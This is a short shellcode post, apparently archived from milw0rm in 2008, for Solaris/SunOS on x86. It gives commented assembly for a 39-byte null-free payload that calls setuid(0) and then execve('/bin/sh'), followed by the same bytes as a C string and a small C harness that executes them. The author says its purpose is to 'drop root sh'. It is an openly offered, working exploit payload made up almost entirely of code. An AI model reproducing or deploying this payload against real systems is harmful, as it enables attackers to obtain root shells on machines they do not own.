/*
; sm4x 2008
; setuid(0), execve('/bin/sh', '/bin/sh', 0),
; 39 bytes NizzULL free (you know...)
; SunOS sol01 5.11 snv_86 i86pc i386 i86pc Solaris
; quick port to drop root sh -  ;)  - SunOS is pwnij

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
int     0x91

; setup //bin/sh
push    eax
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp

; --- array setup
push    eax     ; null
push    ebx     ; //bin/sh
mov     edx, esp

; -- execve()
push    eax     ; 0
push    edx     ; array { "//bin/sh", 0}
push    ebx     ; //bin/sh
mov     al, 0x3b
push    eax
int     0x91

; --- exit
inc	eax
push    eax
push    eax
int     0x91

*/

#include <stdio.h>

char code[] =   "\x31\xc0\x50\x50\xb0\x17\xcd\x91\x50\x68"
		"\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
		"\xe3\x50\x53\x89\xe2\x50\x52\x53\xb0\x3b"
		"\x50\xcd\x91\x40\x50\x50\xcd\x91";


int main(int argc, char **argv) {
 int (*func)();
 printf("Bytes: %d\n", sizeof(code));
 func = (int (*)()) code;
 (int)(*func)();
}

// milw0rm.com [2008-12-02]